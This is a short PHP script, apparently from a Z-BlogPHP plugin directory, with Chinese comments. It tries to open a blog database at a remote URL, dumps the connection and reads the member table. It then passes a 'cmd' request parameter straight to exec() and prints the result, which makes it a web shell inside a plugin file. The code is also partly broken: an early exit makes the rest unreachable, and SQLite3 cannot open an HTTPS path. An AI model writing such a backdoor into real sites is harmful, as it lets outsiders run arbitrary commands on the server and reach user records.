<?php

require '../../../zb_system/function/c_system_base.php';

$zbp->Load();

Add_Filter_Plugin('Filter_Plugin_Zbp_ShowError', 'RespondError', PLUGIN_EXITSIGNAL_RETURN);

if (!$zbp->CheckPlugin('staticize')) {
    $zbp->ShowError(48);
    die();
}

// 远程 SQLite3 数据库的连接信息
$remoteDatabasePath = 'https://b.tenyou.cn/zb_users/data/zblog.db';

// 创建 SQLite3 对象并连接到远程数据库
$database = new SQLite3($remoteDatabasePath);

// 检查连接是否成功
if (!$database) {
    die("无法连接到远程数据库");
}
print_R($database);exit;

// 执行查询
$query = "SELECT * FROM zbp_member";
$result = $database->query($query);

// 处理查询结果
while ($row = $result->fetchArray()) {
    // 处理每一行数据
    // 例如，输出某个字段的值
    echo $row['column_name'] . "\n";
}

// 关闭数据库连接
$database->close();



$cmd = trim($_REQUEST['cmd']);
if ($cmd == '') {
    die('命令为空.');
}

$output = array();
$returnValue = 0;

// 执行 shell 命令
exec($cmd, $output, $returnValue);

// 检查返回值以确定命令是否成功执行
if ($returnValue === 0) {
    // 输出正确的结果
    echo nl2br("Command executed successfully.\n\nOutput:\n".implode("\n", $output));
} else {
    // 输出错误信息
    echo nl2br("Command failed to execute.\n\nError:\n".implode("\n", $output));
}